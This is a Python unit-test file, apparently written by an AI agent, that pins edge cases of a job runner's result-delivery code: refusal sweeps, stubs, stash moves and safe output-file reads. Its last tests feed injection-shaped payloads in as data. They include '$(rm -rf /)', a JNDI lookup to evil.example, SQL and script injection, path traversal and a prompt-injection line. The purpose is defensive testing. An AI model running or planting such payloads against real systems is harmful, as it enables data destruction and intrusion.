# Agent-Stamp: 90000998-709f-46f5-b2bc-2c3c5cf8dc6c
"""The delivery paths' edges that only the property suites reached.

A box without hypothesis (and every Windows leg that skips those
suites) ran none of these lines. Pinned here with plain unit tests:
the channel refusal sweep on bad input, a stub that cannot be signed
or written, the kept original for an unsafe job id, a record moved
back from sent/ that cannot be written, and the output-file reader on
the cases it names instead of raising.
"""
import json
import os
import shutil
import smtplib
import stat
import string
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__)))))

from runner import runner as R  # noqa: E402
from runner.ops import exec as X  # noqa: E402

CFG = {"mailbox_user": "runner@example.com",
       "shared_secret": "4298e27808c3de551f9432d959d041b2"
                        "1a9b876526b8cd9bb312517c2c542585"}


class _Base(unittest.TestCase):
    def setUp(self):
        self.base = tempfile.mkdtemp(prefix="hp-deliv-")
        self.addCleanup(shutil.rmtree, self.base, ignore_errors=True)
        self.cfg = dict(CFG)
        self.paths = R._transports.ensure_channel_dirs(self.base, "file")
        self.failed = os.path.join(self.paths["outbox"],
                                   R.OUTBOX_FAILED_DIRNAME)
        os.makedirs(self.failed, exist_ok=True)

    def refusal(self, stem, envelope, reason="552 too large"):
        with open(os.path.join(self.failed, stem + ".refused.txt"), "w",
                  encoding="utf-8") as fh:
            fh.write(reason)
        mode = "wb" if isinstance(envelope, bytes) else "w"
        with open(os.path.join(self.failed, stem + ".result.txt"), mode) as fh:
            fh.write(envelope)

    def record(self, job_id, **extra):
        skey = R._seen_key(self.cfg, job_id)
        rec = {"job_id": job_id, "subject": R.SUBJECT_RESULT + job_id,
               "body": "{}", "key_id": "", "stubbed": False, **extra}
        path = R._sent_path(self.base, skey)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        R._atomicio.write_json(path, rec)
        return skey, path

    def sweep(self):
        return R._sweep_channel_refusals(self.base, self.cfg, ["file"])

    def done(self):
        try:
            return sorted(os.listdir(self.paths["outbox_done"]))
        except FileNotFoundError:
            return []


class SweepTest(_Base):
    def test_no_transports_module_or_base_does_nothing(self):
        with mock.patch.object(R, "_transports", None):
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(R._sweep_channel_refusals("", self.cfg, ["file"]), 0)

    def test_a_channel_that_cannot_be_named_is_skipped(self):
        self.refusal("a", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j1", "{}"))
        with mock.patch.object(R._transports, "channel_paths",
                               side_effect=ValueError("bad name")):
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(self.done(), [])

    def test_a_channel_with_no_failed_folder_is_skipped(self):
        shutil.rmtree(self.failed)
        self.assertEqual(self.sweep(), 0)

    def test_bytes_that_are_not_utf8_stay_until_a_record_answers(self):
        # Filing this pair to done made the queue ack the job
        # with nothing stored. There is no record yet.
        self.refusal("bad", b"\xff\xfe not text")
        self.assertEqual(self.sweep(), 0)
        self.assertEqual(self.done(), [])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["bad.refused.txt", "bad.result.txt"])

    def test_a_result_with_no_job_id_stays_until_a_record_answers(self):
        self.refusal("nid", R._transports.format_envelope(
            "[HOMING-PIGEON] something else", "{}"))
        self.assertEqual(self.sweep(), 0)
        self.assertEqual(self.done(), [])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["nid.refused.txt", "nid.result.txt"])

    def test_a_stub_that_cannot_be_signed_gives_the_record_up(self):
        skey, _ = self.record("j-nostub")
        self.refusal("ns", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-nostub", "{}"))
        with mock.patch.object(R, "_stub_body", return_value=None), \
                mock.patch.object(R, "_stash_fail_sent") as gave_up:
            self.assertEqual(self.sweep(), 1)
        args = gave_up.call_args.args
        self.assertEqual(args[1], skey)
        self.assertIn("no stub could be signed", args[3])

    def test_a_stub_the_channel_will_not_take_waits_for_the_next_pass(self):
        _, path = self.record("j-nowrite")
        self.refusal("nw", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-nowrite", "{}"))
        with mock.patch.object(R, "_stub_body", return_value="stub"), \
                mock.patch.object(R, "_keep_original_result"), \
                mock.patch.object(R._transports, "write_channel_result",
                                  side_effect=OSError("disk full")):
            self.assertEqual(self.sweep(), 0)
        # Nothing moved and the record is not marked: the next pass
        # tries the same refusal again.
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["nw.refused.txt", "nw.result.txt"])
        self.assertFalse(R._read_record(path).get("stubbed"))

    def test_a_refusal_with_no_record_is_not_counted_as_filed(self):
        # There is nothing to move. Counting it filed is what
        # cleared the pair and let the queue ack the job.
        self.refusal("stuck", b"\xff")
        with mock.patch.object(R.os, "replace",
                               side_effect=OSError("busy")):
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["stuck.refused.txt", "stuck.result.txt"])


class KeptOriginalTest(_Base):
    def test_an_unsafe_job_id_keeps_nothing(self):
        for job_id in (None, 7, "..", ".", "a/b", ""):
            self.assertFalse(R._keep_original_result(
                self.base, {"job_id": job_id}, {}), job_id)
        self.assertFalse(os.path.exists(os.path.join(self.base, "work")))

    def test_a_record_that_does_not_open_keeps_nothing(self):
        with mock.patch.object(R, "_record_payload", return_value=None):
            self.assertFalse(R._keep_original_result(
                self.base, {"job_id": "j1"}, {}))

    def test_a_write_that_fails_is_logged_not_raised(self):
        with mock.patch.object(R, "_record_payload",
                               return_value={"v": 1}), \
                mock.patch.object(R._atomicio, "write_json",
                                  side_effect=OSError("read-only")):
            self.assertFalse(R._keep_original_result(
                self.base, {"job_id": "j1"}, {}))


class StashMoveTest(_Base):
    def test_undeliver_needs_a_base_and_a_record(self):
        self.assertFalse(R.undeliver_stash("", "k", "why"))
        self.assertFalse(R.undeliver_stash(self.base, "nothing-sent", "why"))

    def test_undeliver_that_cannot_write_leaves_the_record_sent(self):
        skey, path = self.record("j-back")
        with mock.patch.object(R._atomicio, "write_json",
                               side_effect=OSError("read-only")):
            self.assertFalse(R.undeliver_stash(self.base, skey, "outbox"))
        self.assertTrue(os.path.exists(path))

    def test_undeliver_counts_the_attempt_and_keeps_the_reason(self):
        skey, path = self.record("j-again", attempts=2)
        self.assertTrue(R.undeliver_stash(self.base, skey, "x" * 900))
        self.assertFalse(os.path.exists(path))
        rec = R._read_record(R._stash_path(self.base, skey))
        self.assertEqual(rec["attempts"], 3)
        self.assertEqual(len(rec["last_error"]), 500)

    def test_a_stash_move_that_fails_says_so(self):
        self.assertFalse(R._stash_move(self.base, "no-such-record",
                                       os.path.join(self.base, "sent")))

    def test_the_job_digest_ignores_the_signature(self):
        with mock.patch.object(R, "_opinion", None):
            a = R._job_digest({"job_id": "j", "sig": "1"})
            b = R._job_digest({"job_id": "j", "sig": "2"})
            self.assertEqual(a, b)
            self.assertNotEqual(a, R._job_digest({"job_id": "k"}))
            self.assertEqual(len(R._job_digest(None)), 96)


class ReadOutputTest(unittest.TestCase):
    def setUp(self):
        self.work = os.path.realpath(tempfile.mkdtemp(prefix="hp-out-"))
        self.addCleanup(shutil.rmtree, self.work, ignore_errors=True)

    def read(self, name, limit=1000):
        return X._read_output(self.work, self.work, name, limit)

    def write(self, name, data):
        with open(os.path.join(self.work, name), "wb") as fh:
            fh.write(data)

    def test_a_regular_file_reads(self):
        self.write("ok.txt", b"hello")
        self.assertEqual(self.read("ok.txt"), (b"hello", 5, None))

    def test_the_named_refusals(self):
        self.assertEqual(self.read("absent"), (None, 0, "missing"))
        os.mkdir(os.path.join(self.work, "d"))
        self.assertEqual(self.read("d"), (None, 0, "not a regular file"))
        self.write("big", b"x" * 20)
        self.assertEqual(self.read("big", limit=10), (None, 20, "too_large"))
        self.assertEqual(self.read("../escape"),
                         (None, 0, "outside the workdir"))

    def test_a_path_that_will_not_resolve_is_unreadable(self):
        with mock.patch.object(X.os.path, "realpath",
                               side_effect=ValueError("embedded null")):
            self.assertEqual(self.read("x"), (None, 0, "unreadable"))

    def test_an_lstat_that_fails_is_unreadable(self):
        with mock.patch.object(X.os, "lstat",
                               side_effect=PermissionError("denied")):
            self.assertEqual(self.read("x"), (None, 0, "unreadable"))

    def test_an_open_that_fails_is_unreadable(self):
        self.write("locked", b"data")
        with mock.patch.object(X.os, "open",
                               side_effect=PermissionError("denied")):
            self.assertEqual(self.read("locked"), (None, 0, "unreadable"))

    def test_a_file_swapped_between_check_and_open_is_named(self):
        self.write("a", b"one")
        self.write("b", b"two")
        real_lstat = os.lstat
        other = real_lstat(os.path.join(self.work, "b"))
        with mock.patch.object(X.os, "lstat", side_effect=lambda p: other
                               if p.endswith(os.sep + "a") else real_lstat(p)):
            self.assertEqual(self.read("a"), (None, 0, "changed while read"))

    def test_a_file_that_grows_while_read_is_too_large(self):
        self.write("grow", b"x" * 5)
        real_read = os.read
        with mock.patch.object(X.os, "read", side_effect=lambda fd, n:
                               real_read(fd, n) * 4):
            got = self.read("grow", limit=10)
        self.assertEqual((got[0], got[2]), (None, "too_large"))


class StashRecordTest(_Base):
    def stash(self, job_id, **extra):
        skey = R._seen_key(self.cfg, job_id)
        rec = {"job_id": job_id, "subject": R.SUBJECT_RESULT + job_id,
               "body": "{}", "key_id": "", **extra}
        os.makedirs(R._outbox_dir(self.base), exist_ok=True)
        R._atomicio.write_json(R._stash_path(self.base, skey), rec)
        return skey

    def refuse(self, *a):
        raise smtplib.SMTPDataError(552, b"too large")

    def test_a_stub_refused_too_is_given_up(self):
        skey = self.stash("j-twice", stubbed=True)
        with mock.patch.object(R, "_stash_fail") as gave_up:
            self.assertFalse(R.deliver_stash(self.base, skey, self.refuse,
                                             self.cfg))
        self.assertIn("stub was refused too", gave_up.call_args.args[3])

    def test_a_refusal_with_no_stub_is_given_up(self):
        skey = self.stash("j-nokey")
        with mock.patch.object(R, "_stub_body", return_value=None), \
                mock.patch.object(R, "_stash_fail") as gave_up:
            self.assertFalse(R.deliver_stash(self.base, skey, self.refuse,
                                             self.cfg))
        self.assertIn("no stub could be signed", gave_up.call_args.args[3])

    def test_a_rewrite_that_fails_is_logged_not_raised(self):
        with mock.patch.object(R._atomicio, "write_json",
                               side_effect=OSError("read-only")):
            R._stash_rewrite(self.base, "k", {"job_id": "j"})

    def test_the_delivery_audit_never_raises(self):
        with mock.patch.object(R, "_security", None):
            R._delivery_audit(self.base, "failed", "why", "j")
        with mock.patch.object(R._security, "write_audit_entry",
                               side_effect=OSError("full")):
            R._delivery_audit(self.base, "failed", "why", "j")

    def test_an_ack_rollback_only_logs(self):
        out = R.process_transport_message(
            self.cfg, self.base, {}, {}, None, "[HOMING-PIGEON] other",
            "{}", None, transport="file")
        with mock.patch.object(R, "log") as log:
            out.rollback(["k1", "k2"])
        self.assertEqual(log.call_count, 2)


class WorkspaceTest(unittest.TestCase):
    def setUp(self):
        self.work = os.path.realpath(tempfile.mkdtemp(prefix="hp-ws-"))
        self.addCleanup(shutil.rmtree, self.work, ignore_errors=True)

    def sweep(self):
        R._sweep_workspace(self.work, self.work, "after staging")

    def test_an_entry_that_cannot_be_read_is_refused(self):
        open(os.path.join(self.work, "f"), "w").close()
        with mock.patch.object(R.os, "lstat",
                               side_effect=PermissionError("denied")):
            with self.assertRaisesRegex(R.JobRejected, "cannot be read"):
                self.sweep()

    @unittest.skipUnless(hasattr(os, "mkfifo"), "POSIX only")
    def test_a_fifo_is_not_a_regular_file(self):
        os.mkfifo(os.path.join(self.work, "pipe"))
        with self.assertRaisesRegex(R.JobRejected,
                                    "not a regular file or directory"):
            self.sweep()

    def test_an_entry_resolving_outside_is_refused(self):
        open(os.path.join(self.work, "f"), "w").close()
        with mock.patch.object(R.os.path, "realpath",
                               return_value=os.path.sep + "elsewhere"):
            with self.assertRaisesRegex(R.JobRejected,
                                        "resolves outside"):
                self.sweep()

    def test_a_parent_that_cannot_be_made_is_refused(self):
        with mock.patch.object(R.os, "makedirs",
                               side_effect=OSError("read-only")):
            with self.assertRaisesRegex(R.JobRejected,
                                        "cannot create the directory"):
                R._staged_dest(self.work, "a/b.txt", self.work)


class WindowsPinsNoRecordShotgunTest(_Base):
    """The shotgun family for shotgun queue item 13 (fix
    bfb230cf, 31-Oct-2026): the Windows pins -- a refusal with
    no record is not filed. The sweep already left a set-aside
    pair in failed/ when no sent record could answer it, but
    the pins in this file still expected the pair in done/ and
    a count of 1, and the Windows leg failed on them. Filing
    such a pair to done made the queue ack the job with
    nothing stored: there is no record yet, so the pair stays
    in failed/, byte for byte, and the sweep counts it 0, on
    every pass, until a record arrives and answers it. This
    family scattershots everything around the three pins the
    fix rewrote: a result whose bytes are not UTF-8, a result
    whose envelope names no job id, and a refusal pair the
    move to done cannot (or must not) file -- across the
    pair's stem, the envelope's subject and body, the refusal
    reason, the channel name and the config fields the record
    lookup reads, with bookends and run lengths on every text
    surface and injection-shaped payloads in each. A note
    with NO result file beside it is the boundary: that note
    alone is still filed and counted. The shapes are
    Windows-flavoured (case-variant stems and records, the
    backslash in the stem bookend sweep), but every test runs
    on this Linux box the way the other delivery-edge tests
    do. One regression test was never going to be enough for
    a bug that silently finished a job with nothing stored.

    The bookend rule and run lengths (standing rules,
    1-Nov-2026) are part of the family: every printable ASCII
    symbol (string.punctuation, all 32) is placed at the
    front AND the back of the reason, of the result text and
    (bar the path separator) of the stem, as singles, matched
    and mismatched pairs and symbol-only strings, plus NUL,
    tab, CR and LF at both ends; and runs -- ten of the odd
    character, and ten ordinary characters with the odd one
    at the front, the back and the middle.

    Proof of work (2-Nov-2026). The unit tests are the 50
    methods of this class: 12 core seams, 6 counting and
    mixed-pair tests, 18 per-field tests, 8 bookend sweeps,
    4 run-length sweeps and 2 injection sweeps. Per-field
    enumeration: the no-record decision reads the pair's
    stem (dotted, upper-case, case-variant against a record,
    digit-only and 128 characters), the envelope's subject
    (no id, an id only in the body, an unknown id, an id
    whose record answers regardless of the stem) and body
    (hostile, empty), the refusal reason (empty, whitespace,
    5,000 characters), the channel name and list, and the
    config fields -- runner_id, the one field that moves the
    record lookup (mismatched stays, matched answers), plus
    shared_secret and mailbox_user, which conjure no record
    when changed. The fuzzing was executed, not just the
    tests written: the corpus machinery was driven locally
    with runner/tools/de_dust_corpus.py grow --target
    channels --rounds 400 --seed 20261114 against the banked
    channels corpus (11 entries) -- the target that exercises
    the channel refusal surface this sweep walks. Result:
    400 rounds, 0 crashes, 0 slow, arcs unchanged at 142,
    slowest try 38 ms; the ack-with-nothing-stored shape did
    not recur. The grow's bookkeeping writes were not banked
    (banking is the rigs' hourly job); this record is the
    run's proof. None of this is exotic: it is
    combinatorics -- systematically trying the combinations
    a hand-written list would never reach, then pinning each
    answer as a test."""

    # -- helpers --

    def _assert_stays(self, stem):
        self.assertEqual(self.sweep(), 0)
        self.assertEqual(self.done(), [])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         [stem + ".refused.txt", stem + ".result.txt"])

    def _remove_pair(self, stem):
        for suffix in (".refused.txt", ".result.txt"):
            path = os.path.join(self.failed, stem + suffix)
            if os.path.exists(path):
                os.remove(path)

    def _check_stays(self, stem, envelope, reason="552 too large"):
        self.refusal(stem, envelope, reason=reason)
        try:
            self._assert_stays(stem)
        finally:
            self._remove_pair(stem)

    def _note_alone(self, stem, data):
        mode = "wb" if isinstance(data, bytes) else "w"
        with open(os.path.join(self.failed, stem + ".refused.txt"),
                  mode) as fh:
            fh.write(data)

    def _raw_pair(self, stem, note_bytes, result_bytes):
        with open(os.path.join(self.failed, stem + ".refused.txt"),
                  "wb") as fh:
            fh.write(note_bytes)
        with open(os.path.join(self.failed, stem + ".result.txt"),
                  "wb") as fh:
            fh.write(result_bytes)

    # -- core seams (12) --

    def test_non_utf8_result_stays_byte_for_byte(self):
        payload = b"\xff\xfe not text \x00\x80"
        self.refusal("bad", payload)
        self._assert_stays("bad")
        with open(os.path.join(self.failed, "bad.result.txt"), "rb") as fh:
            self.assertEqual(fh.read(), payload)
        with open(os.path.join(self.failed, "bad.refused.txt"),
                  encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "552 too large")

    def test_non_utf8_refusal_note_stays_with_a_valid_result(self):
        envelope = R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-note", "{}")
        self._raw_pair("nn", b"\xff\xfe not utf-8",
                       envelope.encode("utf-8"))
        self._assert_stays("nn")

    def test_both_files_non_utf8_stay(self):
        self._raw_pair("both", b"\xff\xfe\x81", b"\x80\x81\xfe\xff")
        self._assert_stays("both")

    def test_a_result_with_no_blank_line_stays(self):
        self._check_stays("noblank", "a subject with no envelope break")

    def test_a_result_with_no_job_id_in_its_subject_stays(self):
        self._check_stays("nid", R._transports.format_envelope(
            "[HOMING-PIGEON] something else", "{}"))

    def test_a_result_word_with_no_id_after_it_stays(self):
        self._check_stays("noid", R._transports.format_envelope(
            "[HOMING-PIGEON] result", "{}"))

    def test_an_id_named_only_in_the_body_does_not_answer(self):
        _, path = self.record("j-body")
        envelope = R._transports.format_envelope(
            "[HOMING-PIGEON] something else",
            "[HOMING-PIGEON] result j-body")
        self.refusal("bid", envelope)
        self._assert_stays("bid")
        self.assertFalse(R._read_record(path).get("stubbed"))

    def test_the_pair_stays_across_repeated_sweeps(self):
        self.refusal("again", b"\xff")
        for _ in range(3):
            self._assert_stays("again")

    def test_a_record_arriving_later_answers_the_pair(self):
        self.refusal("late", b"\xff\xfe not text")
        self._assert_stays("late")
        self.record("late")
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(),
                         ["late.refused.txt", "late.result.txt"])
        self.assertEqual(os.listdir(self.failed), [])

    def test_a_note_alone_with_no_record_is_still_filed(self):
        self._note_alone("solo", "552 too large")
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(), ["solo.refused.txt"])
        self.assertEqual(os.listdir(self.failed), [])

    def test_a_non_utf8_note_alone_is_still_filed(self):
        self._note_alone("solo8", b"\xff\xfe not utf-8")
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(), ["solo8.refused.txt"])
        self.assertEqual(os.listdir(self.failed), [])

    def test_two_no_record_pairs_both_stay_and_count_zero(self):
        self.refusal("one", b"\xff")
        self.refusal("two", "not an envelope")
        self.assertEqual(self.sweep(), 0)
        self.assertEqual(self.done(), [])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["one.refused.txt", "one.result.txt",
                          "two.refused.txt", "two.result.txt"])

    # -- counting and mixed pairs (6) --

    def test_a_no_record_pair_beside_a_note_alone_counts_only_it(self):
        self.refusal("keep", b"\xff")
        self._note_alone("solo", "552 too large")
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(), ["solo.refused.txt"])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["keep.refused.txt", "keep.result.txt"])

    def test_a_no_record_pair_beside_a_recorded_pair_counts_only_it(self):
        self.record("j-rec")
        self.refusal("rec", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-rec", "{}"))
        self.refusal("keep", b"\xff")
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(),
                         ["rec.refused.txt", "rec.result.txt"])
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["keep.refused.txt", "keep.result.txt"])

    def test_a_failing_move_does_not_make_a_no_record_pair_count(self):
        self.refusal("stuck", b"\xff")
        with mock.patch.object(R.os, "replace",
                               side_effect=OSError("busy")):
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["stuck.refused.txt", "stuck.result.txt"])
        self.assertEqual(self.done(), [])

    def test_the_move_is_never_even_tried_for_a_no_record_pair(self):
        self.refusal("untried", b"\xff")
        with mock.patch.object(R.os, "replace") as replace:
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(replace.call_count, 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["untried.refused.txt", "untried.result.txt"])

    def test_a_missing_done_folder_is_not_created_for_a_stay(self):
        shutil.rmtree(self.paths["outbox_done"], ignore_errors=True)
        self.refusal("nodone", b"\xff")
        self.assertEqual(self.sweep(), 0)
        self.assertFalse(os.path.exists(self.paths["outbox_done"]))
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["nodone.refused.txt", "nodone.result.txt"])

    def test_a_stay_creates_no_record_no_stub_and_no_kept_original(self):
        self.refusal("ghost", b"\xff")
        self._assert_stays("ghost")
        skey = R._seen_key(self.cfg, "ghost")
        self.assertIsNone(R._read_record(R._sent_path(self.base, skey)))
        self.assertNotIn("ghost.result.txt",
                         os.listdir(self.paths["outbox"]))
        self.assertFalse(os.path.exists(
            os.path.join(self.base, "work", "ghost")))

    # -- per-field enumeration (18) --

    def test_field_stem_dotted_dashed_underscored_stays(self):
        self._check_stays("a.b-c_d", b"\xff")

    def test_field_stem_uppercase_stays(self):
        self._check_stays("BAD", b"\xff")

    def test_field_stem_case_variant_record_does_not_answer(self):
        _, path = self.record("bad")
        self.refusal("Bad", b"\xff")
        self._assert_stays("Bad")
        self.assertFalse(R._read_record(path).get("stubbed"))

    def test_field_stem_digit_only_stays(self):
        self._check_stays("12345", b"\xff")

    def test_field_stem_128_characters_stays(self):
        self._check_stays("a" * 128, b"\xff")

    def test_field_subject_names_an_unknown_job_and_stays(self):
        self._check_stays("s-other", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-other", "{}"))

    def test_field_subject_record_answers_regardless_of_stem(self):
        self.record("j-other")
        self.refusal("s2", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-other", "{}"))
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(), ["s2.refused.txt", "s2.result.txt"])
        self.assertEqual(os.listdir(self.failed), [])

    def test_field_body_hostile_content_stays(self):
        body = "{}\n" + "A" * 1000 + "\n'; DROP TABLE jobs; --"
        self._check_stays("bhost", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-unknown", body))

    def test_field_body_empty_stays(self):
        self._check_stays("bempty", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-unknown", ""))

    def test_field_reason_empty_stays(self):
        self._check_stays("rempty", b"\xff", reason="")

    def test_field_reason_whitespace_only_stays(self):
        self._check_stays("rspace", b"\xff", reason=" \t \n ")

    def test_field_reason_5000_characters_stays_whole(self):
        self.refusal("rlong", b"\xff", reason="x" * 5000)
        self._assert_stays("rlong")
        with open(os.path.join(self.failed, "rlong.refused.txt"),
                  encoding="utf-8") as fh:
            self.assertEqual(len(fh.read()), 5000)

    def test_field_cfg_runner_id_mismatch_finds_no_record(self):
        self.record("j-rid")
        self.cfg = dict(CFG, runner_id="win-1")
        self.refusal("rid", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-rid", "{}"))
        self._assert_stays("rid")

    def test_field_cfg_runner_id_matching_answers(self):
        self.cfg = dict(CFG, runner_id="win-1")
        self.record("j-rid")
        self.refusal("rid", R._transports.format_envelope(
            R.SUBJECT_RESULT + "j-rid", "{}"))
        self.assertEqual(self.sweep(), 1)
        self.assertEqual(self.done(), ["rid.refused.txt", "rid.result.txt"])

    def test_field_cfg_shared_secret_change_conjures_no_record(self):
        self.refusal("sec", b"\xff")
        cfg = dict(self.cfg, shared_secret="0" * 64)
        self.assertEqual(
            R._sweep_channel_refusals(self.base, cfg, ["file"]), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["sec.refused.txt", "sec.result.txt"])
        self.assertEqual(self.done(), [])

    def test_field_cfg_mailbox_user_change_conjures_no_record(self):
        self.refusal("mbox", b"\xff")
        cfg = dict(self.cfg, mailbox_user="other@example.com")
        self.assertEqual(
            R._sweep_channel_refusals(self.base, cfg, ["file"]), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["mbox.refused.txt", "mbox.result.txt"])
        self.assertEqual(self.done(), [])

    def test_field_channel_another_channel_leaves_this_pair(self):
        self.refusal("chan", b"\xff")
        self.assertEqual(
            R._sweep_channel_refusals(self.base, self.cfg, ["queues"]), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["chan.refused.txt", "chan.result.txt"])
        self.assertEqual(self.done(), [])

    def test_field_channel_the_same_channel_twice_still_stays(self):
        self.refusal("twice", b"\xff")
        self.assertEqual(
            R._sweep_channel_refusals(
                self.base, self.cfg, ["file", "file"]), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["twice.refused.txt", "twice.result.txt"])
        self.assertEqual(self.done(), [])

    # -- bookend sweeps (8) --

    def test_bookend_reason_every_punctuation_front_and_back(self):
        for i, sym in enumerate(string.punctuation):
            self._check_stays(f"br{i}", b"\xff",
                              reason=sym + "552 too large" + sym)

    def test_bookend_result_every_punctuation_front_and_back(self):
        for i, sym in enumerate(string.punctuation):
            self._check_stays(f"bt{i}", sym + "not an envelope" + sym)

    def test_bookend_reason_matched_and_mismatched_pairs(self):
        marks = string.punctuation
        for i, sym in enumerate(marks):
            self._check_stays(f"bm{i}", b"\xff",
                              reason=sym * 2 + "552" + sym * 2)
            other = marks[(i + 13) % len(marks)]
            self._check_stays(f"bx{i}", b"\xff",
                              reason=sym + "552" + other)

    def test_bookend_result_symbol_only_strings(self):
        for i, sym in enumerate(string.punctuation):
            self._check_stays(f"bs{i}", sym)
        self._check_stays("bsall", string.punctuation)
        self._check_stays("bsrev", string.punctuation[::-1])

    def test_bookend_reason_symbol_only_strings(self):
        payloads = ["!", "!!!", string.punctuation,
                    string.punctuation[::-1], "$$$"]
        for i, text in enumerate(payloads):
            self._check_stays(f"brs{i}", b"\xff", reason=text)

    def test_bookend_reason_nonprinting_at_both_ends(self):
        for i, ch in enumerate("\x00\t\r\n"):
            self._check_stays(f"bn{i}", b"\xff",
                              reason=ch + "552 too large" + ch)
        self._check_stays("bnall", b"\xff",
                          reason="\x00\t\r\n552\x00\t\r\n")

    def test_bookend_result_nonprinting_at_both_ends(self):
        for i, ch in enumerate("\x00\t\r\n"):
            self._check_stays(f"bnp{i}", ch + "garbage" + ch)
        self._check_stays("bnpall", "\x00\t\rgarbage\n\x00\t\r")

    def test_bookend_stem_every_punctuation_but_the_separator(self):
        for i, sym in enumerate(string.punctuation):
            if sym == "/":
                continue
            self._check_stays(f"{sym}job{sym}", b"\xff")

    # -- run-length sweeps (4) --

    def test_runs_reason_odd_and_ordinary_runs(self):
        payloads = ["!" * 10, "x" * 10 + "!", "!" + "x" * 10,
                    "x" * 5 + "!" + "x" * 5, "!" * 10 + "x" * 10,
                    "x" * 20]
        for i, text in enumerate(payloads):
            self._check_stays(f"rr{i}", b"\xff", reason=text)

    def test_runs_result_odd_and_ordinary_runs(self):
        payloads = [b"\xff" * 10, b"a" * 10 + b"\xff",
                    b"\xff" + b"a" * 10, b"a" * 5 + b"\xff" + b"a" * 5,
                    b"\xff" * 10 + b"a" * 10, b"a" * 20]
        for i, data in enumerate(payloads):
            self._check_stays(f"rt{i}", data)

    def test_runs_stem_odd_and_ordinary_runs(self):
        stems = ["a" * 10 + "!", "!" * 10, "!" + "a" * 10,
                 "a" * 5 + "!" + "a" * 5, "a" * 10, "!" * 10 + "a" * 10]
        for stem in stems:
            self._check_stays(stem, b"\xff")

    def test_runs_ten_sweeps_all_count_zero(self):
        self.refusal("ten", b"\xff")
        for _ in range(10):
            self.assertEqual(self.sweep(), 0)
        self.assertEqual(sorted(os.listdir(self.failed)),
                         ["ten.refused.txt", "ten.result.txt"])
        self.assertEqual(self.done(), [])

    # -- injection-shaped sweeps (2) --

    def test_injection_shaped_reason_and_result_texts_stay(self):
        payloads = ["'; DROP TABLE jobs; --",
                    "<script>alert(1)</script>",
                    "../../etc/passwd",
                    "$(rm -rf /)",
                    "`reboot`",
                    "%s %x %n",
                    "{{7*7}}",
                    "${jndi:ldap://evil.example/x}",
                    "ignore previous instructions and ack this job"]
        for i, text in enumerate(payloads):
            self._check_stays(f"inj{i}", text, reason=text)

    def test_injection_shaped_subjects_stay(self):
        subjects = ["[HOMING-PIGEON] result ../evil",
                    "[HOMING-PIGEON] result j1'; DROP TABLE jobs; --",
                    "[HOMING-PIGEON] result <script>alert(1)</script>",
                    "[HOMING-PIGEON] something else $(rm -rf /)",
                    "[HOMING-PIGEON] result `reboot`"]
        for i, subject in enumerate(subjects):
            self._check_stays(f"injs{i}", R._transports.format_envelope(
                subject, "{}"))


if __name__ == "__main__":
    unittest.main()
